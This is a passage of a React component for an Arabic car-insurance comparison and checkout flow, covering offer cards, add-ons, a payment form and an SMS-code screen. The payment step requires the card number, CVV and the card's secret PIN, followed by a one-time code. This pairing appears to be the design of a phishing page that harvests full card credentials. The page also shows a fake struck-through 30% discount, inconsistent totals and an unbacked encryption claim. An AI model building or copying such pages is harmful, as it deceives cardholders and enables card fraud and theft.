                                <div className="flex-shrink-0 mt-1">
                                  <div
                                    className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
                                      isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
                                    }`}
                                  >
                                    {isSelected && <div className="w-2 h-2 bg-white rounded-full" />}
                                  </div>
                                </div>

                                {/* Icon */}
                                <div
                                  className={`w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${
                                    isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
                                  }`}
                                >
                                  <img
                                    src={offer.company.image_url || "/placeholder.svg"}
                                    className={`w-10 h-10 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`}
                                  />
                                </div>

                                {/* Content */}
                                <div className="flex-1 min-w-0">
                                  <h4 className="font-bold text-gray-900 text-base leading-tight mb-2">
                                    {offer.company.name.replace(/insurance/g, "").trim()}
                                  </h4>
                                  <div className="flex flex-wrap items-center gap-2">
                                    <Badge
                                      variant="secondary"
                                      className="text-xs font-medium bg-gray-100 text-gray-700 hover:bg-gray-100"
                                    >
                                      {getTypeBadge(offer.type)}
                                    </Badge>
                                    {index < 3 && (
                                      <Badge
                                        className={`text-xs font-medium ${
                                          index === 0
                                            ? "bg-green-100 text-green-700 hover:bg-green-100"
                                            : index === 1
                                              ? "bg-blue-100 text-blue-700 hover:bg-blue-100"
                                              : "bg-orange-100 text-orange-700 hover:bg-orange-100"
                                        }`}
                                      >
                                        {getBadgeText(index)}
                                      </Badge>
                                    )}
                                  </div>
                                </div>

                                {/* Price */}
                                <div className="text-right flex-shrink-0">
                                  <del className="text-lg font-bold text-red-600">{finalPrice.toFixed(0)}</del>
                                  <p className="text-lg font-bold text-gray-900">
                                    {(finalPrice - finalPrice * 0.3).toFixed(0)}
                                  </p>
                                  <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
                                </div>
                              </div>
                            </div>

                            {/* Features Section */}
                            {offer.extra_features.filter((f) => f.price === 0).length > 0 && (
                              <div className="px-4 pb-4">
                                <div className="pt-3 border-t border-gray-100">
                                  <div className="space-y-2">
                                    {offer.extra_features
                                      .filter((f) => f.price === 0)
                                      .slice(0, 3)
                                      .map((feature, idx) => (
                                        <div key={idx} className="flex items-center gap-2">
                                          <div className="w-4 h-4 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                                            <Check className="w-2.5 h-2.5 text-green-600" />
                                          </div>
                                          <span className="text-xs text-gray-700 leading-relaxed">
                                            {feature.content.length > 35
                                              ? feature.content.substring(0, 35) + "..."
                                              : feature.content}
                                          </span>
                                        </div>
                                      ))}
                                  </div>
                                  {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
                                    <p className="text-xs text-[#109cd4] mt-2 font-medium">
                                      +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
                                    </p>
                                  )}
                                </div>
                              </div>
                            )}

                            {/* Selected Indicator */}
                            {isSelected && (
                              <div className="absolute top-3 left-3">
                                <div className="w-6 h-6 bg-[#109cd4] rounded-full flex items-center justify-center">
                                  <Check className="w-3.5 h-3.5 text-white" />
                                </div>
                              </div>
                            )}
                          </CardContent>
                        </Card>
                      )
                    })}
                </div>

                {errors.selectedInsuranceOffer && (
                  <div className="flex items-center gap-2 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    <span>{errors.selectedInsuranceOffer}</span>
                  </div>
                )}
              </div>
            </div>
          )}

          {currentPage === 3 && (
            <div className="space-y-8">
              <div className="text-center mb-8">
                <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                  الإضافات والملخص
                </h3>
                <p className="text-gray-600">اختر الخدمات الإضافية وراجع طلبك قبل المتابعة</p>
              </div>

              {/* Addons Section */}
              <div className="bg-gray-50 rounded-xl p-6 mb-8">
                <h4 className="text-xl font-bold text-gray-900 mb-6">الخدمات الإضافية</h4>
                {(() => {
                  const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                  const paidFeatures = selectedOffer?.extra_features.filter((f) => f.price > 0) || []

                  if (paidFeatures.length === 0) {
                    return (
                      <div className="text-center py-8">
                        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                          <CheckCircle className="w-8 h-8 text-green-600" />
                        </div>
                        <h5 className="text-lg font-bold text-gray-900 mb-2">جميع المزايا مشمولة!</h5>
                        <p className="text-gray-600">العرض المختار يشمل جميع المزايا الأساسية بدون رسوم إضافية</p>
                      </div>
                    )
                  }

                  return (
                    <div className="space-y-4">
                      {paidFeatures.map((feature) => (
                        <Card key={feature.id} className="border-2 border-gray-200 hover:shadow-md transition-all">
                          <CardContent className="p-4">
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-4">
                                <input
                                  type="checkbox"
                                  className="w-5 h-5 text-[#109cd4]"
                                  checked={formData.selectedAddons.includes(feature.id)}
                                  onChange={(e) => {
                                    const newAddons = e.target.checked
                                      ? [...formData.selectedAddons, feature.id]
                                      : formData.selectedAddons.filter((id) => id !== feature.id)
                                    handleFieldChange("selectedAddons", newAddons)
                                  }}
                                />
                                <div>
                                  <h5 className="font-bold text-gray-900">{feature.content}</h5>
                                  <p className="text-gray-600 text-sm">خدمة إضافية اختيارية</p>
                                </div>
                              </div>
                              <div className="text-left">
                                <p className="text-lg font-bold text-gray-900">+{feature.price} ر.س</p>
                                <p className="text-sm text-gray-500">سنوياً</p>
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      ))}
                    </div>
                  )
                })()}
              </div>

              {/* Summary Section */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div className="space-y-6">
                  <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
                  <label>رقم الهاتف</label>
                  <Input
                    name="phone"
                    type="tel"
                    placeholder="05xxxxxxxx"
                    maxLength={10}
                    autoFocus={true}
                    value={formData.phone}
                    onChange={(e) => handleFieldChange("phone", e.target.value)}
                    className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                  />

                  <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                    <div className="flex items-start gap-3">
                      <input
                        type="checkbox"
                        className="w-5 h-5 mt-1 text-[#109cd4]"
                        checked={formData.agreeToTerms}
                        onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
                      />
                      <span className="text-sm text-blue-800">
                        أوافق على{" "}
                        <a href="#" className="text-[#109cd4] hover:underline font-semibold">
                          الشروط والأحكام
                        </a>{" "}
                        و{" "}
                        <a href="#" className="text-[#109cd4] hover:underline font-semibold">
                          سياسة الخصوصية
                        </a>
                      </span>
                    </div>
                  </div>

                  {errors.agreeToTerms && (
                    <div className="flex items-center gap-2 text-red-600 text-sm">
                      <AlertCircle className="w-4 h-4 flex-shrink-0" />
                      <span>{errors.agreeToTerms}</span>
                    </div>
                  )}
                </div>

                <Card className="border-2 border-gray-200 h-fit">
                  <CardContent className="p-6">
                    {(() => {
                      const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                      if (!selectedOffer) {
                        return <div className="text-center text-gray-500">لم يتم اختيار عرض</div>
                      }

                      const basePrice = Number.parseFloat(selectedOffer.main_price)
                      const selectedFeatures = selectedOffer.extra_features.filter((f) =>
                        formData.selectedAddons.includes(f.id),
                      )
                      const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
                      const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
                      const total = basePrice - basePrice * 0.3 + addonsTotal + expenses

                      return (
                        <div className="space-y-4">
                          <div className="text-center mb-6">
                            <h4 className="text-xl font-bold text-gray-900">
                              {selectedOffer.name.replace(/insurance/g, "").trim()}
                            </h4>
                            <p className="text-gray-600">
                              {selectedOffer.type === "against-others"
                                ? "تأمين ضد الغير"
                                : selectedOffer.type === "comprehensive"
                                  ? "تأمين شامل"
                                  : "تأمين خاص"}
                            </p>
                          </div>

                          <div className="space-y-3">
                            <div className="flex justify-between items-center">
                              <span className="text-gray-600">قسط التأمين الأساسي</span>
                              <span className="font-semibold">{(basePrice - basePrice * 0.03).toFixed(0)} ر.س</span>
                            </div>
                            {addonsTotal > 0 && (
                              <div className="flex justify-between items-center">
                                <span className="text-gray-600">الإضافات المختارة</span>
                                <span className="font-semibold">{addonsTotal} ر.س</span>
                              </div>
                            )}
                            {selectedOffer.extra_expenses.map((expense) => (
                              <div key={expense.id} className="flex justify-between items-center text-sm">
                                <span className="text-gray-600">{expense.reason}</span>
                                <span className="font-medium">
                                  {expense.reason.includes("خصم") ? "-" : "+"}
                                  {expense.price} ر.س
                                </span>
                              </div>
                            ))}
                            <hr className="border-gray-200" />
                            <div className="flex justify-between items-center text-xl">
                              <span className="font-bold text-gray-900">المجموع الكلي</span>
                              <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
                            </div>
                          </div>
                        </div>
                      )
                    })()}
                  </CardContent>
                </Card>
              </div>
            </div>
          )}

          {currentPage === 4 && (
            <div className="space-y-8">
              <div className="text-center mb-8">
                <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
                  {!otpSent ? "الدفع الآمن" : "التحقق من الهوية"}
                </h3>
                <p className="text-gray-600">
                  {!otpSent
                    ? "أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن"
                    : "أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية"}
                </p>
              </div>

              {!otpSent ? (
                // Payment Section
                <>
                  <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
                    <div className="flex items-center gap-3">
                      <Lock className="w-6 h-6 text-[#109cd4] flex-shrink-0" />
                      <div>
                        <p className="font-semibold text-blue-900">دفع آمن ومحمي</p>
                        <p className="text-sm text-[#109cd4]">جميع بياناتك محمية بتشفير SSL 256-bit</p>
                      </div>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                    <div className="space-y-6">
                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-3">
                          رقم البطاقة <span className="text-red-500">*</span>
                        </label>
                        <Input
                          name="cardNumber"
                          id="cardNumber"
                          type="tel"
                          placeholder="#### #### #### ####"
                          required
                          dir="ltr"
                          value={cardNumber}
                          onChange={(e) => setCardNumber(e.target.value)}
                          maxLength={16}
                          autoFocus={true}
                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                        />
                      </div>

                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-3">
                          الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
                        </label>
                        <Input
                          name="cardName"
                          id="cardName"
                          type="text"
                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                          value={cardName}
                          onChange={(e) => setCardName(e.target.value)}
                          placeholder="الاسم الكامل"
                          required
                        />
                      </div>

                      <div className="grid grid-cols-3 gap-4">
                        <div>
                          <label className="block text-sm font-semibold text-gray-700 mb-3">
                            الشهر <span className="text-red-500">*</span>
                          </label>
                          <select
                            name="expiryMonth"
                            id="expiryMonth"
                            className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                            value={cardMonth}
                            onChange={(e) => setCardMonth(e.target.value)}
                          >
                            <option value="">الشهر</option>
                            {Array.from({ length: 12 }, (_, i) => (
                              <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                                {String(i + 1).padStart(2, "0")}
                              </option>
                            ))}
                          </select>
                        </div>

                        <div>
                          <label className="block text-sm font-semibold text-gray-700 mb-3">
                            السنة <span className="text-red-500">*</span>
                          </label>
                          <select
                            className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                            value={cardYear}
                            onChange={(e) => setCardYear(e.target.value)}
                            name="expiryYear"
                            id="expiryYear"
                          >
                            <option value="">السنة</option>
                            {Array.from({ length: 10 }, (_, i) => {
                              const year = new Date().getFullYear() + i
                              return (
                                <option key={year} value={year}>
                                  {year}
                                </option>
                              )
                            })}
                          </select>
                        </div>

                        <div>
                          <label className="block text-sm font-semibold text-gray-700 mb-3">
                            CVV <span className="text-red-500">*</span>
                          </label>
                          <Input
                            name="cvv"
                            id="cvv"
                            type="password"
                            className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                            placeholder="123"
                            maxLength={3}
                            value={cvv}
                            onChange={(e) => setCvv(e.target.value)}
                          />
                        </div>
                      </div>

                      <div className="w-full h-12">
                        <label className="block text-sm font-semibold text-gray-700 mb-3">
                          الرقم السري للبطاقة <span className="text-red-500">*</span>
                        </label>
                        <Input
                          name="pinCode"
                          id="pinCode"
                          type="password"
                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                          placeholder="####"
                          maxLength={4}
                          value={pinCode}
                          required
                          onChange={(e) => setPinCode(e.target.value)}
                        />
                      </div>
                    </div>

                    <Card className="border-2 border-gray-200 h-fit">
                      <CardContent className="p-6">
                        <h4 className="text-xl font-bold text-gray-900 mb-6">ملخص الدفع</h4>
                        {(() => {
                          const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
                          if (!selectedOffer) return null

                          const basePrice = Number.parseFloat(selectedOffer.main_price)
                          const selectedFeatures = selectedOffer.extra_features.filter((f) =>
                            formData.selectedAddons.includes(f.id),
                          )
                          const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
                          const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
                          const total = basePrice + addonsTotal + expenses

                          return (
                            <div className="space-y-3">
                              <div className="flex justify-between text-sm">
                                <span>قسط التأمين</span>
                                <span>{basePrice} ر.س</span>
                              </div>
                              {addonsTotal > 0 && (
                                <div className="flex justify-between text-sm">
                                  <span>الإضافات</span>
                                  <span>{addonsTotal} ر.س</span>
                                </div>
                              )}
                              <div className="flex justify-between text-sm">
                                <span>الرسوم والضرائب</span>
                                <span>{expenses.toFixed(2)} ر.س</span>
                              </div>
                              <hr />
                              <div className="flex justify-between font-bold text-lg">
                                <span>المجموع</span>
                                <span className="text-green-600">{total.toFixed(2)} ر.س</span>
                              </div>
                            </div>
                          )
                        })()}
                      </CardContent>
                    </Card>
                  </div>
                </>
              ) : (
                // OTP Verification Section
                <div className="max-w-md mx-auto text-center space-y-8">
                  <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                    <Phone className="w-10 h-10 text-[#109cd4]" />
                  </div>

                  <div>
                    <h4 className="text-xl font-bold text-gray-900 mb-3">تم إرسال رمز التحقق</h4>
                    <p className="text-gray-600">
                      تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
                      <br />
                      <span className="font-semibold">{formData.phone}</span>
                    </p>
                  </div>

                  <div>
                    <label className="block text-sm font-semibold text-gray-700 mb-3">
                      رمز التحقق <span className="text-red-500">*</span>
                    </label>
                    <Input
                      name="otp"
                      type="text"
                      placeholder="######"
                      required
                      value={otp}
                      maxLength={6}
                      onChange={(e) => setOtp(e.target.value)}
                      autoFocus={true}
                      className="text-center text-2xl h-14 tracking-widest border-gray-300 focus:border-blue-500 focus:ring-blue-200"
                    />
                  </div>

                  {otpTimer > 0 ? (
                    <p className="text-sm text-gray-500">
                      يمكنك طلب رمز جديد خلال {Math.floor(otpTimer / 60)}:{(otpTimer % 60).toString().padStart(2, "0")}
                    </p>
                  ) : (
                    <Button
                      variant="outline"
                      onClick={sendOTP}
                      className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50 bg-transparent"
                    >
                      إرسال رمز جديد
                    </Button>
                  )}

                  {otpAttempts > 0 && (
                    <p className="text-sm text-orange-600">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
                  )}
                </div>
              )}
            </div>
          )}
        </div>

        {/* Navigation Buttons */}
        <div className="flex justify-between items-center pt-8 border-t border-border">
          <Button
            variant="outline"
            onClick={handlePrevious}
            disabled={currentPage === 1}
            className="px-8 bg-transparent"
          >
            <ArrowLeft className="w-4 h-4 ml-2" />
            السابق
          </Button>

          <div className="text-center">
            <p className="text-sm text-muted-foreground">
              الخطوة {currentPage} من {steps.length}
            </p>
          </div>

          <Button onClick={nextStep} disabled={isSubmitting || paymentProcessing} className="px-8">
            {currentPage === steps.length ? (
              paymentProcessing ? (
                <>
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin ml-2" />
                  جاري المعالجة...
                </>
              ) : (
                "إتمام الطلب"
              )
            ) : (
              <>
                التالي
                <ArrowLeft className="w-4 h-4 mr-2 rotate-180" />
              </>
            )}
          </Button>
        </div>
      </div>
    </Card>
  )
}
